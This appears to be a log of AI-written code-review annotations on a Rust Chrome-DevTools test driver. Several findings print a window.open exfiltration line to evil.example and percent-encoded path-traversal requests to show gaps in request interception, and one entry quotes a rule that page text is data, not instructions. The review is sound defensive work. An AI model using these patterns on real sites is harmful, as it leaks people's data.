{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/access.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T06:48:30.089962Z","id":"c57c0de8733614ceeea93371264bed98e0a34e3bfda10cb41ad303661dc86586","body":{"detail":"BrowseGrant (spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md §4.5) holds a BrowseRule, and BrowserAccess::now reads browser.browse.url_rule into it, so the type is needed before browse.rs exists. browse.rs (sender_urls, allowed) can use it from here or re-export it; moving it changes no behaviour.","kind":"alternative","span":{"start":{"line":91},"end":{"line":105},"content_hash":"e2d1c86f7c702dbb0fa3c51304ad1502986b9b778f885326859e4adfaf1e762d"},"summary":"Keep BrowseRule in browser/browse.rs, where docs/superpowers/plans/2026-11-19-claxbot-browser.md Task 20 puts it, instead of here in access.rs","tags":["revisit:when browser/browse.rs is written","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/access.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T06:48:30.119411Z","id":"4ba7a6bdca209df6af61ff4b86ebf360524ffb654925cfd83ea7dd56b7b1bcea","body":{"detail":"Spec §10.1 lists one time setting, browser.test_seconds, yet §4.5 gives BrowseGrant its own seconds. BrowserAccess::now fills both TestGrant::seconds and BrowseGrant::seconds from browser.test_seconds (crates/clax-bot/src/browser/access.rs, let seconds = ...), so one admin setting bounds every browser session and nothing new is stored.","kind":"alternative","span":{"start":{"line":114},"end":{"line":122},"content_hash":"749169a3175427d7bfde4d3d5aa7874f2cfda0eedc55119131c48a44c920007e"},"summary":"A browse's time cap of its own (browser.browse_seconds) instead of the per-test cap browser.test_seconds","tags":["revisit:an admin needs browses capped apart from tests","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:12:36.082967Z","id":"c6f33269eb80bfc469c19159b755338b1e25a018d15ed9ac18bd5ce2e2a9cc30","body":{"detail":"Spec §5.4 makes the deadline before the page loaded an error (browser_timeout, charged), and a setup refusal browser_unavailable with opened set; a bare Value cannot carry either, so outcome is a Result and the caller (plan Task 9) charges whenever the error's `opened` is true. The request policy is a trait (RequestPolicy, with TestPolicy over serve::Site) so plan Task 20's browse egress is another implementation rather than a branch inside run_test; Start (Test {origin, path} or Browse {url}) replaces origin_or_url and also resolves each goto. SessionLimits carries RunLimits::image_side, which scales screenshots through Page.captureScreenshot's clip.scale (session.rs `screenshot`), so no image is decoded in clax-bot.","kind":"comment","span":{"start":{"line":160},"end":{"line":170},"content_hash":"33749d7e2b1dd56001ed89a46fbedf05dfe6d4574beb843308417ca17825a2aa"},"summary":"run_test's interface departs from docs/superpowers/plans/2026-11-19-claxbot-browser.md Task 7: TestRun::outcome is Result<Value, BrowserError>, not a bare result Value, and run_test takes Start, &dyn RequestPolicy and SessionLimits instead of origin_or_url, pages and serve","tags":["browser","plan-deviation","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:12:36.083056Z","id":"55bb004c0d6284ce132dbd2c8c3f988997cd9119c1d2ddce232cdb4c43a96623","body":{"detail":"Saved tests through the bridge hook are plan Task 10 (docs/superpowers/plans/2026-11-19-claxbot-browser.md). Until it lands, any build that serves clax.browser.test (plan Task 9) ignores `tests`, so a script asking for its saved tests is told passed: true without them having run.","kind":"concern","span":{"start":{"line":200},"end":{"line":207},"content_hash":"a7970022988ea48f0b5cc9e58a82bdcbb067e185a5cffb6f638f54978c89fd0c"},"suggested_fix":"Land plan Task 10 before the browser operations are served to runs; if Task 10 is cut, refuse `tests` in opts::parse_opts with invalid_args instead.","summary":"opts.tests is parsed (opts::parse_opts, Tests::All / Tests::Paths) but run_test runs no saved tests yet: a call with {tests: true} answers without a `tests` member and can pass","tags":["browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:12:36.083117Z","id":"99388a93803fecdae8244dfa8a30601d32368da604a4df158f36d914d14ccdad","body":{"detail":"docs/superpowers/specs/2026-11-19-claxbot-browser-design.md §5.4 says a deadline or cancellation after the load does not throw; before the load, the deadline is browser_timeout, and a cancellation is answered clax_bot_sandbox::CODE_CANCELLED, as every other cancelled host call is. `opened` is true, so under §8.2 (a browser that opened is charged whatever it answered) plan Task 9 charges its time. A closed connection before the load is browser_unavailable retryable; a refused command there is browser_unavailable not retryable.","kind":"comment","span":{"start":{"line":314},"end":{"line":335},"content_hash":"e644f000a2bd67db5ab44ce25e52ac87479d34f0f631b8a6826dda63840bae47"},"summary":"A cancellation before the page loaded answers the sandbox's `cancelled` code with opened set; spec §5.4's table lists no code for it","tags":["browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/serve.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:12:36.083159Z","id":"d46927a89a163a826f55028c2d6a956f22f05b1281ddc027d83f989b338afd64","body":{"detail":"Wrapped pages carry the bare bridge URL `/_clax/bridge.js` (clax_core::wrap::wrap_page with an empty bridge version), because BrowserSource has no way to name the host's bridge version; the page's `?v=` query, when present, is dropped before clax_file. A host implementing clax_file and site_api (plan Task 13, crates/clax-server/src/browser_source.rs) must answer those shapes: clax_file(\"/_clax/bridge.js\"), clax_file(\"/_clax/bridge/<part>\"), site_api(person, artifact, \"/_clax/api/db/notes?limit=5\").","kind":"comment","span":{"start":{"line":213},"end":{"line":259},"content_hash":"012e946ffdabdee13a9df873bb8064fb3759873530b3e9d7484810f29b9f3989"},"summary":"What a BrowserSource is asked by Site::answer: clax_file gets the path without its query; site_api gets the whole path and query, `/_clax/api/` included; GET and HEAD reach site_api","tags":["browser","host-contract","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/serve.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:12:36.083187Z","id":"4bcca3801f76a1ac72deb795df972bf3211ee981979869d58e1bca158e586cb1","body":{"detail":"The spec and the plan say an empty script, and the session also sets Network.setBypassServiceWorker, so a page's worker intercepts nothing during a test. An empty script still installs a no-op worker for the test's incognito context, which is discarded with it; the site's script would need BrowserSource to expose it (it is the host's), which the trait does not.","kind":"alternative","span":{"start":{"line":224},"end":{"line":228},"content_hash":"9d6c9b50a9b7fcd2a74b41f2bc90eedb5f9c0709e3e5aea202c69949c4395236"},"summary":"Answer a service worker's script with the site's own self-unregistering script (docs/contract.md, \"Sites\") instead of the empty script spec §6.2 names","tags":["browser","revisit:a test page misbehaves because its service worker registration resolves to an empty worker","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/opts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:12:36.083235Z","id":"996e4618bcb0eb129d359555bfd26ca215e1e7b1657240104830e9bad1d8a7f5","body":{"detail":"So that no CDP frame the driver sends is unbounded by the script. docs/superpowers/specs/2026-11-19-claxbot-browser-design.md §5.3 says 'At most 6 a test' without saying how; refusing before a browser opens (opts.rs, `parse_opts`, the screenshot count) costs the person nothing, where cutting would charge a test whose screenshots were silently dropped.","kind":"comment","span":{"start":{"line":49},"end":{"line":51},"content_hash":"de14f81eafc872371f94a3ed6a4e20b24a87eabe5c07b69b86075f20d283fa29"},"summary":"Caps the spec does not name: a selector of at most 1,000 characters, `type` text, an `eval`/`expect` expression and a `goto` of at most 10,000; and the 6-screenshot cap is refused at parse time (invalid_args) rather than cut","tags":["browser","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:12:36.083283Z","id":"d0d06f641ebfe3b330a9d84055214a114ae7c8177201f81028c8f3e53c3cb38d","body":{"detail":"Spec §6.4 says every request whose origin is not the synthetic one is failed. Fetch.enable here applies to the page target attached in run_test (session.rs `open`). Whether Chrome reports a dedicated or shared worker's fetches, or a cross-origin iframe's subresources, as Fetch.requestPaused on the page session is not verified: FakeChrome cannot tell. The site's content security policy (connect-src 'self', default-src 'self') still refuses those origins, and .invalid never resolves, so the gap is defence in depth, beside the channels waiver 2c32e212 already accepts on the spec.","kind":"concern","span":{"start":{"line":722},"end":{"line":731},"content_hash":"704dd18b798995d05e9923f86d3b81ea51ee6f90d5d30c5e6f9f8c352b9824dd"},"suggested_fix":"In the opt-in live test (plan Task 19), load a page that starts a worker fetching another origin and frames another origin, and check each is listed as blocked; if not, add Target.setAutoAttach {autoAttach: true, waitForDebuggerOnStart: true, flatten: true} and enable Fetch on each attached session before resuming it.","summary":"Request interception is enabled on the page's own session only: no Target.setAutoAttach, so out-of-process iframes and workers, which Chrome gives targets of their own, are not attached and their requests may not pass through Site::answer","tags":["browser","egress","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:45:58.404509Z","id":"c683e8cfbd9a9f36f046ba77e4ba460fed890f4d1e032a224dd8685ea608699b","body":{"kind":"resolve","ref":"git:22019c64d","summary":"Fixed: with opts.tests the driver runs the target's saved tests through window.claxTest after the steps, puts their TestResults in the result's tests, and a failed test fails the result. Evidence: bazel test //crates/clax-bot/... passes, among it browser::session::tests::saved_tests_run_through_the_bridge_hook, a_failed_saved_test_fails_the_result, browser::serve::tests::tests_true_lists_the_targets_test_files and the run-level browser::saved_tests_results_come_through (tests: {passed: 1, failed: [submits]}, passed: false); bazel test //web:unit passes bridge-clax-test.test.ts.","supersedes":"55bb004c0d6284ce132dbd2c8c3f988997cd9119c1d2ddce232cdb4c43a96623","tags":["reason:fixed","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:37.157568Z","id":"6f17ce40f73df37999614b872098c7b803347cd852c3b48514738adaed40744c","body":{"detail":"Fetch.enable is sent on the one page session made by Target.attachToTarget (module docs, steps 2-3); there is no Target.setAutoAttach, Target.setDiscoverTargets or targetCreated handling in session.rs, and preamble_js removes WebRTC but leaves window.open. A page under test that runs window.open(\"https://evil.example/?d=\" + data), or whose link with target=_blank is clicked, opens a second target in the same browser context whose requests are not paused, so Site::answer never fails them. CSP does not govern window.open navigations, and the click step dispatches real mouse events (spec §5.2), which satisfy the popup blocker's user-gesture rule. This defeats spec §6.4's rule that every request whose origin is not the synthetic one is failed. It is distinct from thread d0d06f64, which covers out-of-process iframes and workers.","kind":"concern","span":{"start":{"line":208},"end":{"line":222},"content_hash":"c8f56e724faa519328e1ecace962ae8c38210b0f117ed2347045eda26bd1a5eb"},"suggested_fix":"Send Target.setAutoAttach {autoAttach: true, waitForDebuggerOnStart: true, flatten: true} on the page session and, for each attachedToTarget of type page, close it (Target.closeTarget) or enable Fetch on it before Runtime.runIfWaitingForDebugger; also replace window.open with a function that returns null in preamble_js. Test with the fake Chrome: a page that calls window.open to another origin is listed in requests.blocked with why origin.","summary":"A popup (window.open, or a clicked target=_blank link) is a new target the driver never attaches, so its navigation to any origin escapes Fetch interception and reaches the network","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/opts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:37.157633Z","id":"e77cb375343b190045983b3b13e9f841aa3da92d3451cdccdd65da686ad6685b","body":{"detail":"eval_js computes the size with the page's own globals, and the driver takes v[\"json\"] as given (crates/clax-bot/src/browser/session.rs:995-1002) without measuring it. A page that replaces TextEncoder.prototype.encode (or JSON.stringify) passes any value back, and with returnByValue the whole string is put in the result the model reads, unbounded by MAX_EVAL_BYTES (spec §5.2: 16 KiB at most). The same holds for tests_of (session.rs:245-260), which caps the number of failures but not the length of each name or error text, and for wait_js, whose 10 s bound is the page's setTimeout. The page is untrusted relative to the run: its text is data, never instructions (spec §5.1 rules).","kind":"concern","span":{"start":{"line":876},"end":{"line":884},"content_hash":"07b3e0572944b48a951b19bb4c7b9cea4e1a84d721476eb766eb047ad20d219d"},"suggested_fix":"Measure on the driver side too: refuse a json string over MAX_EVAL_BYTES in the Step::Eval arm, cut each failure's name and error in tests_of (for example to 1,000 characters), and capture JSON.stringify, TextEncoder and setTimeout in preamble_js before page scripts run (stored on a non-configurable property) so the step expressions use the originals.","summary":"The eval step's 16 KiB cap is checked only in the page, with JSON.stringify and TextEncoder the page under test can replace; the driver accepts any length","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:37.157694Z","id":"f06b60496c74b9a6caf755d68155247f58c383012d379e8ba64f5ae44d26454e","body":{"detail":"total_ms is timeout_s*1000 minus the time spent, exactly the time to the Cdp deadline. The hook (web/bridge/src/bridge.ts:219-221) first waits in usesSettled for up to USES_MS (5 s) and then starts runTests, whose totalMs clock starts only then (web/bridge/src/harness.ts:233), plus the Runtime.evaluate round trip. When tests time out or are slow, the harness's own 'ran out' handling (skipped counts, 'the run's N ms ran out' failures) finishes after the driver's deadline fired, so saved_tests ends with CdpFail::Deadline, the result carries no tests member and only \"time\" in truncated, instead of the partial results the harness was built to report.","kind":"concern","span":{"start":{"line":756},"end":{"line":763},"content_hash":"971b1817c4959114e8bda1b83e12a74dd5185a9370168a5a97d6d5bf82f9712d"},"suggested_fix":"Leave a margin: pass total_ms minus USES_MS and a round-trip slack (for example 6 s, floored at 1), or have the hook start its totalMs clock before usesSettled and the driver subtract a fixed slack.","summary":"Saved tests are given the call's whole remaining time as totalMs, so a suite that runs to its total ends after the driver's deadline and every test result is lost","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/opts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:37.157738Z","id":"c96fde3567e288b52b5f6715a4c1d66b97bee54d45acc2f560f4a4c8b217eceb","body":{"detail":"artifact_path splits on ['/', '?', '#'] only to find `..` and returns the string whole, so parse_target keeps \"about.html?tab=2\". Pages (crates/clax-bot/src/clax/browser.rs:446 for a draft, :463 read_file_async for a version) look up that whole string as a path, find no such file and refuse browser_target_not_found, though Origin::url would load it correctly. A goto step with a query works, so the two disagree.","kind":"concern","span":{"start":{"line":365},"end":{"line":386},"content_hash":"06bb4b88b7474dbd8621e572b928023f832bf3ce6ef877f64e33fe3b8551616d"},"suggested_fix":"Either refuse `?` and `#` in target.path with invalid_args naming the field, or split them off in parse_target (BrowserTarget gets the bare path for the existence check and keeps the query for the URL); add a test either way.","summary":"target.path accepts a query or fragment (about.html?tab=2), which the target check then looks up as a file name and refuses browser_target_not_found","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/mod.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:37.157771Z","id":"0a3c37b4d55e688a399fac24f40953a3f58f897bfe4199dc9b3e88321efa309e","body":{"detail":"Site::answer (crates/clax-bot/src/browser/serve.rs:252-264) passes url::Url::path() as is: the WHATWG parser removes literal and %2e dot segments but keeps %2F, so a page can request /_clax/bridge/..%2F..%2Fsecret or /_clax/api/db/x%2F..%2F..%2Fapi%2Fartifacts. No host implements BrowserSource yet; the daemon's will be the first, and a router that decodes before matching could serve a file outside the bridge's directory or an API route outside the artifact's site. The trait states that a source does not check the request policy, so the rule belongs in its contract.","kind":"suggestion","span":{"start":{"line":168},"end":{"line":177},"content_hash":"5f5d43cd538514f77bd903700f3a288f17c25c03a4096f204f2913ed98f66eb1"},"suggested_fix":"State in both docs that the path is the raw, percent-encoded URL path; that clax_file must answer None for anything but an exact match of the site's bridge files; and that site_api must route it as the artifact's own site would, scoped to `artifact`, without decoding %2F into segments. Or refuse in Site::answer, 404, any /_clax/ path holding %2F, %5C or %2E.","summary":"BrowserSource::clax_file and site_api receive the page's path still percent-encoded, and their docs do not say what a host must do with %2F or %2E sequences","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:39.547522Z","id":"68df9a00ae06a362f58ec3d3b8adc96c834330c26aa19d07a482bbb3557b094e","body":{"detail":"Failure: a test whose page runs `window.open('https://evil.example/?d=' + encodeURIComponent(JSON.stringify(rows)))` from a click handler (a `click` step gives it user activation), or has `<a target=_blank href=https://evil.example/?d=...>` that a step clicks: the popup's navigation request is not a Fetch.requestPaused on session S and is never failed, so the person's data read through /_clax/api/ leaves the browser. Fetch.enable (session.rs open, lines 849-853) is sent on the page's own session only; Chrome creates the popup as a separate page target in the same browser context, and Fetch interception is per target (https://chromedevtools.github.io/devtools-protocol/tot/Fetch/#method-enable applies to the target the session is attached to). Spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 6.4 says every request whose origin is not the synthetic one is failed, top-level navigations included, which no content security policy governs; so the CSP argument of concern d0d06f64 (workers, iframes) does not cover this channel. Driver::handle (session.rs 470-579) also answers every paused request on self.session rather than the event's own session (ev.session), so attaching more targets later needs that changed too. FakeChrome cannot show the gap: PageModel never creates a second target.","kind":"blocker","span":{"start":{"line":849},"end":{"line":863},"content_hash":"dc1430671580bde8e7985e9a90655731d252cd5d345ea3ba41ac43fd946daa4c"},"suggested_fix":"Before Target.createTarget, send Target.setAutoAttach {autoAttach: true, waitForDebuggerOnStart: true, flatten: true} (or Target.setDiscoverTargets plus attach) on the browser session; on each Target.attachedToTarget in the test's browser context, send Fetch.enable with the same pattern on that session, then Runtime.runIfWaitingForDebugger, and answer Fetch.requestPaused on ev.session. Alternatively close every new page target at once (Target.closeTarget on Target.targetCreated with openerId set) and list it as blocked. Add a PageModel case that emits Target.attachedToTarget for a popup and assert its request is failed.","summary":"A popup the page opens (window.open, a target=_blank link, a form with target=_blank) is a new target nobody attached, so its requests are never paused and reach the network directly","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:39.547618Z","id":"3211e8ad972c15d5e2032b00d77f7067f9bc57254af7bbf1f38a73f450f3482f","body":{"detail":"Failure: steps [{goto: \"index.html#settings\"}] on a test started at index.html (or any goto differing from the current URL only after '#', which Start::goto at session.rs 173-184 keeps): Page.navigate answers without loaderId and Chrome fires no Page.loadEventFired for a same-document navigation (https://chromedevtools.github.io/devtools-protocol/tot/Page/#method-navigate: loaderId is omitted in case of same-document navigation). Driver::navigate set self.loaded = false at line 629 and loops `while !self.loaded` at 650-653 on next_event, so the step waits until the deadline; the result then has the goto failed with 'the test's time ran out', every later step skipped, passed false and \"time\" in truncated, and the person is charged the whole timeout. Hash-routed single-page apps are common among claxen. awaiting_document also stays true, so the next Document request (an iframe's) sets the result's status. PageModel (fake.rs 398-403, 417) always answers loaderId \"L\", so no test can reach this path.","kind":"blocker","span":{"start":{"line":636},"end":{"line":654},"content_hash":"7aa7aec21fbb27cafdd416cc4e59dbefa299fafce0579160b8486550b705445a"},"suggested_fix":"In navigate, when the Page.navigate answer has no loaderId, clear awaiting_document and return Ok(Ok(())) without waiting for the load (the settle that follows still runs). Teach PageModel to answer a fragment-only navigate without loaderId and without a load event, and add a goto-to-#fragment test.","summary":"A goto that only changes the fragment (same-document navigation) waits for a Page.loadEventFired that never comes, until the deadline","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:39.547685Z","id":"cf987e89c6a627f1a1cc3d3454a4a42c47f24acc814ed346cfaa3934757e1a47","body":{"detail":"Failure: a page that calls `alert('saved')` in an inline script, or a `click` step on a delete button whose handler calls `confirm('Delete?')`: Chrome sends Page.javascriptDialogOpening and holds the renderer until Page.handleJavaScriptDialog answers (https://chromedevtools.github.io/devtools-protocol/tot/Page/#event-javascriptDialogOpening). Driver::handle ignores that event (it falls to `_ => {}` at line 576), so the pending Runtime.evaluate or the wait for Page.loadEventFired never completes: during load the call fails browser_timeout with nothing gathered, after load the click step fails with 'the test's time ran out' and the rest are skipped; either way the whole timeout is charged. A goto from a page with a beforeunload handler after a click (user activation) blocks the same way. Spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 5.2 asks that a covered button be a finding, not a timeout; a confirm() is the same kind of page behaviour.","kind":"blocker","span":{"start":{"line":470},"end":{"line":579},"content_hash":"6a4d3fd7d0f857dac118dd45932ccee14e9fa61ccedb296c1957216431634490"},"suggested_fix":"Handle Page.javascriptDialogOpening in Driver::handle: send_only Page.handleJavaScriptDialog {accept: true} (with promptText empty for prompt; accept for beforeunload) on ev.session, and push a console entry naming the dialog type and message (level 'info' or 'warning'). Add a PageModel option that emits the event in answer to an evaluate and holds the answer until handleJavaScriptDialog arrives.","summary":"A JavaScript dialog (alert, confirm, prompt, beforeunload) is never answered: the page's main thread blocks and the test hangs until its deadline","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:39.547738Z","id":"c520c38433664721f969ba643c142a4d14e29e02b17eb39808d1ca5bbfde48f9","body":{"detail":"Driver::open (session.rs 877-881) runs navigate and then settle; drive maps any CdpFail from open through setup_error (line 674). So when the page has loaded (self.loaded is true) but SETTLE_JS's two animation frames never come, e.g. a page that starts `setTimeout(() => { for (;;) {} }, 0)` after load or blocks its main thread, the call throws browser_timeout ('the page did not load within N s') and the console messages and uncaught errors already gathered are dropped. Spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 5.4 limits browser_timeout to 'the deadline passed before the page loaded' and says a deadline or cancellation after the load answers with what was gathered, passed false and \"time\" in truncated. The module doc (session.rs 47-53) silently redefines 'loaded' to include settle. The diagnostics are exactly what a script needs for a page that hangs after load.","kind":"concern","span":{"start":{"line":671},"end":{"line":674},"content_hash":"99d12aebffdfe3301a09ca5b69318abeee8f971dc082120530c9cfcb3208de73"},"suggested_fix":"Split open: if navigate succeeded (self.loaded true) and settle fails, return the loaded state and let drive treat the failure as after-load (self.end(&fail), remaining steps skipped). Add a test where the deadline fires on the SETTLE_JS evaluate after an after_load console event and assert a result with that console entry and \"time\" in truncated.","summary":"A deadline, cancellation or closed socket during settle, after Page.loadEventFired, is answered as a before-load error (browser_timeout, cancelled, browser_unavailable) with everything gathered thrown away","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/cdp.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:39.547779Z","id":"394c21e0cb02c1c2e159707f34873e30f782b3f04f7cc509d85036c0d1bca0e4","body":{"detail":"Cdp::read returns parse(&frame)? at cdp.rs 295, so an unparseable frame ends the current wait with CdpFail::Protocol and the frame (possibly the awaited answer) is lost. serde_json 1.0.151 (Cargo.lock) rejects a lone surrogate hex escape in a string (ErrorCode::LoneLeadingSurrogateInHexEscape, src/read.rs 913, 959). JavaScript strings may hold lone surrogates, and Chrome's DevTools JSON writer emits non-ASCII UTF-16 code units as hex escapes one by one, so `console.log('ab'.slice(0,1) + String.fromCharCode(0xD83D))`, a thrown Error whose message holds one, or a document.title holding one, yields a frame that fails to parse. Consequences in session.rs: during navigate (next_event at 651) the call becomes browser_unavailable before load; during a step, Driver::step turns the Protocol failure into 'the browser refused it' and, for an action, skips the rest; during collect it fails the test (drive 735-737). The page under test, not the browser, decides the outcome.","kind":"concern","span":{"start":{"line":141},"end":{"line":168},"content_hash":"0360a68bfc303181a2fd0bcc0e4487271ac21450c44917ef1a32f96b0e4d3055"},"suggested_fix":"Make an event frame that fails to parse non-fatal: drop it (or record one console entry saying a browser message could not be read) and keep reading; for answers, parse leniently, e.g. replace lone surrogate escapes with the replacement character before serde_json::from_str, so the awaited answer is not lost. Add a cdp.rs test with a frame carrying a lone surrogate escape.","summary":"One frame serde_json cannot parse fails whatever command is waiting, and page JavaScript can produce such a frame with a lone UTF-16 surrogate","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:39.547828Z","id":"32a61e203dfa61fbe036fa27fde9386781845b92d6131c031b5cb05d8740f590","body":{"detail":"collect_js slices outerHTML to MAX_HTML + 1 and innerText to MAX_TEXT_CHARS + 1 JavaScript code units; Driver::collected (session.rs 800-813) decides whether \"html\"/\"text\" go in truncated with cut_chars, which counts chars. For a page with astral characters (emoji, CJK extension B) the sliced string has fewer than MAX_HTML + 1 chars, so cut_chars reports no cut although the page's HTML was cut: e.g. 60,000 emoji (120,000 code units) come back as about 50,000 chars and truncated omits \"html\". htmlLength and textLength are computed in the page but never read. If code unit 100,000 (or 20,000 for text) falls between a surrogate pair, the slice ends in a lone surrogate and the evaluate answer may fail to parse (see the concern on crates/clax-bot/src/browser/cdp.rs parse), failing the collect and the test.","kind":"concern","span":{"start":{"line":263},"end":{"line":269},"content_hash":"1a5e382bf37379993fdd52df8305dd77c78c621d84206eb668dd67c0ea6e5bd9"},"suggested_fix":"Mark the cut from the page's own lengths (htmlLength > MAX_HTML, textLength > MAX_TEXT_CHARS), and slice in the page by code points without splitting pairs, e.g. Array.from(s).slice(0, N).join('') or a slice that backs off one unit when the last is a high surrogate; keep cut_chars as the Rust-side bound.","summary":"collect_js cuts html and text by UTF-16 code units but Driver::collected checks the cut by Unicode scalar values, so a cut can go unreported in truncated, and a cut inside a surrogate pair can fail the test","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-bot/src/browser/session.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-11-19T07:53:39.547869Z","id":"9354968d79e3ae5fd2525e8410777e96d432a53a87ede022f38e90dd8a16df3a","body":{"detail":"eval_js (opts.rs 880-884) checks the size with JSON.stringify and new TextEncoder() in the page's main world; the page under test can replace either (e.g. `TextEncoder = class { encode() { return [] } }`), and step_inner's Step::Eval arm returns v[\"json\"] parsed with no length check. Likewise tests_of (session.rs 245-260) caps the number of failures at 50 but not the length of each name or error, and a page can define window.claxTest itself (saved_tests_js only checks typeof t.run); title and url from collect (789-795) have no cap either. So a page decides how large the result is that is journaled and shown to the model, while spec docs/superpowers/specs/2026-11-19-claxbot-browser-design.md section 5.2 caps eval values at 16 KiB. html, text and console are already re-cut in Rust, which shows the intended pattern.","kind":"concern","span":{"start":{"line":993},"end":{"line":1003},"content_hash":"28f7c30cd949ac432025fbc4dd85e21696a425d865a07dbd8782393f9de5d174"},"suggested_fix":"In the Eval arm, refuse json longer than MAX_EVAL_BYTES bytes ('the value is over 16 KiB as JSON') before parsing; cut each test failure's name and error, title and url to fixed character caps in Rust. Optionally run step scripts in an isolated world (Page.createIsolatedWorld) so page code cannot redefine the builtins they use.","summary":"The eval 16 KiB cap and the saved tests' failure list are enforced only by script running in the page's own realm, which the page can redefine; nothing re-checks them in Rust","tags":["review","review:browser-phase1","session:claude-code:45f8f414-5fc7-4063-9013-583e3e7b95ea"]}}
